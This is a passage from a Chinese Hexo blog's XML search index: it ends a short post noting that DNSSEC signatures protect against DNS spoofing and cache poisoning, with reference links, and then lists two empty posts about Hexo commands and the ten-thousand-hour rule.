extensions</p><p>可有效防御DNS欺骗和缓存污染，使用数字签名保证DNS返回包的真实性和完整性</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>[1] dnsviz.net</p><p>链接：<a href="https://dnsviz.net/d/pizzaseo.com/dnssec/">https://dnsviz.net/d/pizzaseo.com/dnssec/</a></p><p>[2] DNSSEC 2024-01-30 13:38:58</p><p>链接：<a href="https://help.aliyun.com/document_detail/149662.html">https://help.aliyun.com/document_detail/149662.html</a></p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>dns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dns</tag>
      
      <tag>network</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo_command</title>
    <link href="/2024/02/06/hexoblog/hexo_command/"/>
    <url>/2024/02/06/hexoblog/hexo_command/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
    
    
    <categories>
      
      <category>hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一万小时定律</title>
    <link href="/2024/02/06/10000hours/"/>
    <url>/2024/02/06/10000hours/</url>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>life</category>
      
    </categories>
    
    
    <tags>
      
      <tag>life</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
